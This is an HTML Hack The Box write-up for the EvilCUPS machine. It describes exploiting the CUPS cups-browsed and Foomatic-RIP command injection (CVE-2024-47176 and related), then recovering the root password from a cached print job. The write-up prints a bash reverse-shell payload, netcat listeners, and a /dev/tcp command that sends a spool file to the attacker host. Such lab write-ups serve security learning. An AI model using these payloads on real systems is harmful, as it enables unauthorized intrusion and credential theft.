@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D3p4k-EvilCUPS HTB</title>
+    <link rel="icon" type="image/png" href="https://labs.hackthebox.com/storage/avatars/4291edf91628b7c378a58084318a70c1.png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../writeup.css">
+    </head>
+<body>
+    <!-- Socials -->
+    <div class="socials">
+        <a href="https://www.linkedin.com" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="https://app.hackthebox.com/profile/1979344" target="_blank">
+            <svg style="width: 24px; height: 24px;" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <title>Hack The Box</title>
+                <path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z" fill="white"></path>
+            </svg>
+        </a>
+        <a href="https://github.com" target="_blank"><i class="fab fa-github"></i></a>
+    </div>
+
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">EvilCUPS - Hack the box</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="../../index.html">Home</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#Write-up">Write-up</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Sections -->
+    <div class="container">
+        <section id="machine-info" class="section">   
+            <h2>Machine Info</h2>
+            <p>
+      <strong>EvilCUPS</strong> is a <strong>Medium difficulty Linux machine</strong> that features a 
+      <strong>CUPS Command Injection Vulnerability</strong> 
+      (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47176" target="_blank">CVE-2024-47176</a>). 
+      This CVE allows remote unauthenticated users the ability to install a malicious printer on the vulnerable machine over 
+      <code>UDP/631</code>.
+    </p>
+    <p>
+      This printer is configured to utilize 
+      <a href="https://linux.die.net/man/1/foomatic-rip" target="_blank">Foomatic-RIP</a>, 
+      which is used to process documents and where the command injection happens. In order to trigger the command execution, 
+      a document needs to be printed. The CUPS Webserver is configured to allow anonymous users access to 
+      <code>TCP/631</code>.
+    </p>
+    <p>
+      Navigating here makes it possible to print a test page on the malicious printer and gain access as the <code>lp</code> user. 
+      This user has the ability to retrieve past print jobs, one of which contains the root password to the box.
+    </p>
+            <img src="https://labs.hackthebox.com/storage/avatars/4291edf91628b7c378a58084318a70c1.png">
+        </section>
+
+        <section id="enumeration" class="section">
+    <h2>Enumeration</h2>
+    <h3>Nmap:</h3>
+    <!-- Terminal Window: Rustscan Output -->
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+           <pre><code>nmap -sV -sC 10.129.231.157 -oA EvilCUPS
+Host is up (0.038s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
+|_  256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)
+631/tcp open  ipp     CUPS 2.4
+|_http-title: Home - CUPS 2.4.2
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+        </div>
+    </div>
+    <p>An Nmap scan reveals that SSH is running on its default port, and port 631 is open for CUPS&#x27;s web interface, suggesting the presence of a print server. Researching CUPS shows that it also operates on UDP. Conducting another scan on UDP port 631 confirms that CUPS is active on this port as well.</p>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+    <pre><code>nmap -sU -p631 10.129.231.157                   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 11:19 IST
+Nmap scan report for 10.129.231.157
+Host is up (0.046s latency).
+
+PORT    STATE         SERVICE
+631/udp open|filtered ipp
+
+Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
+</code></pre>
+</div>
+</div>
+</section>
+
+<section id="Foothold" class="section">
+<h2>Foothold:</h2>
+<p id="18079dbf-6729-8051-8db6-c7dc049b4af0" class="">The CUPS Web Interface advertises that CUPS Version 2.4.2 is running, which was released March 4, 2022. Additionally, the copyright on the footer of the CUPS Page is from 2022.</p>
+<img src="./Webpage.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<img src="./printer.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<p>A search for recent CUPS vulnerabilities reveals several notable ones from 2024, including:</p><ul class="bulleted-list"><li style="list-style-type:disc"><strong>CVE-2024-47176</strong>: cups-browsed</li></ul><ul id="18079dbf-6729-80cd-bd2b-cf445d65d3da" class="bulleted-list"><li style="list-style-type:disc"><strong>CVE-2024-47076</strong>: libcupsfilters</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>CVE-2024-47175</strong>: libppd</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>CVE-2024-47177</strong>: Foomatic-RIP</li></ul><p>These vulnerabilities, discovered by EvilSocket, are detailed in an excellent blog post. We’ll leverage these CVEs to achieve remote code execution on the target system.</p>
+</section>
+
+<section id="Command Execution" class="section">
+<h2><strong><span style="border-bottom:0.05em solid">Getting Command Execution:</span></strong></h2><p >A public proof-of-concept (PoC) for automating this attack is available at <a href="https://github.com/ippsec/evil-cups">https://github.com/ippsec/evil-cups</a>. This PoC sets up an IPP server on port 12345, which delivers malicious printer attributes designed to inject a Foomatic-RIP payload. It then sends a cups-browsed packet to the target, instructing the CUPS server to install the crafted printer.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>python3 evilcups.py 10.10.14.57 10.129.231.157 &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.57/443 0&gt;&amp;1&quot; &amp;&#x27;
+</code></pre>
+</div>
+</div>
+<img src="./cmdexec.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<p>To achieve command execution, a print job must be sent to the installed printer. The CUPS Management Server does not treat printing test pages as a sensitive action, meaning unauthenticated users can perform this task if the server is exposed.</p><p>Steps to execute the command:</p><ol type="1" class="numbered-list" start="1"><li>Navigate to <code>http://10.129.231.157:631</code>.</li></ol><ol type="1" class="numbered-list" start="2"><li>Click on <strong>Printers</strong> and select the printer you installed.</li></ol><ol type="1" class="numbered-list" start="3"><li>Open the <strong>Maintenance</strong> dropdown menu.</li></ol><ol type="1" class="numbered-list" start="4"><li>Select <strong>Print Test Page</strong>.</li></ol><p>This action will trigger the execution of the malicious command embedded in the Foomatic-RIP payload.</p>
+<img src="./rev.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>nc -lvnp 443                 
+listening on [any] 443 ...
+connect to [10.10.14.57] from (UNKNOWN) [10.129.231.157] 45428
+bash: cannot set terminal process group (1310): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@evilcups:/home/htb$ cat user.txt
+cat user.txt
+679c8bc29*************************</code></pre>
+</div>
+</div>
+</section>
+
+<section id="Privilege Escalation" class="section">
+<h2><strong>Privilege Escalation:</strong></h2><p >The CUPS service typically runs as the <code>lp</code> user, which has limited permissions. However, one capability of this user is accessing cached printing jobs. If you navigate to the CUPS Management Server, click on the printer queue (e.g., <strong>Canon_MB2300_series</strong>), and review <strong>Completed Jobs</strong>, you may notice a job was sent to the printer. Jobs often end in <code>1</code>, indicating they are the first job.</p><h3>Cached Job Storage</h3><p>Cached print jobs are stored in <code>/var/spool/cups/</code>. The <code>lp</code> user only has <strong>execute</strong> permissions for this directory, meaning it cannot list the directory contents. However, if you know the exact filename of a cached job and it is readable, the <code>lp</code> user can access it.</p><h3>File Naming Format</h3><p>By default, completed job files follow this naming convention:</p><p><code>d&lt;print job&gt;-&lt;page number&gt;</code></p><ul class="bulleted-list"><li style="list-style-type:disc"><strong>Print job</strong>: A 5-digit number.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>Page number</strong>: A 3-digit number.</li></ul><p>For example, <strong>Job 1, Page 1</strong> would be stored as <code>d00001-001</code>.</p><h3>Extracting the PostScript File</h3><p>To retrieve and view the contents of a cached print job, use the following command:</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>cat /var/spool/cups/d00001-001</code></pre>   
+</div>
+</div>
+<p>This will display the PostScript output of the print job, which might contain sensitive information or further clues for exploitation.</p><p>Since the target machine does not have <code>netcat</code> installed, we can use the <code>/dev/tcp</code> path to send the data or file to ourselves.</p>   
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>lp@evilcups:/$ cat /var/spool/cups/d00001-001 &gt; /dev/tcp/10.10.14.56/4444</code></pre>
+</div>
+</div>
+<p>We can attempt to convert this <code>.ps</code> file (as indicated by the file header) into a PDF format. To transfer the file, start a new listener using <code>nc</code> on port 4444 and save the incoming data into a file named <code>printer.ps</code>.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code class="language-Bash">nc -lvnp 4444 &gt; printer.ps
+listening on [any] 4444 ...
+connect to [10.10.14.57] from (UNKNOWN) [10.129.231.157] 46466</code></pre>        
+</div>
+</div>
+<p>The password is visible in plaintext in the file, but it’s more fun to create a visible image of what was printed. I’ll take that file and save a copy on my host. I’ll use <code>ps2pdf</code> to generate a PDF:</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>ps2pdf printer.ps printer.pdf</code></pre>
+</div>
+</div>
+<p>And then open the resulting PDF:</p>
+<img src="./pdf.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Using that password with <code>su</code> successfully grants a root shell.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>lp@evilcups:/var/spool/cups$ su -
+Password: 
+root@evilcups:~# cat /root/root.txt
+b6ac9ebb**********************
+root@evilcups:~# </code></pre>
+</div>
+</div>
+</section>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
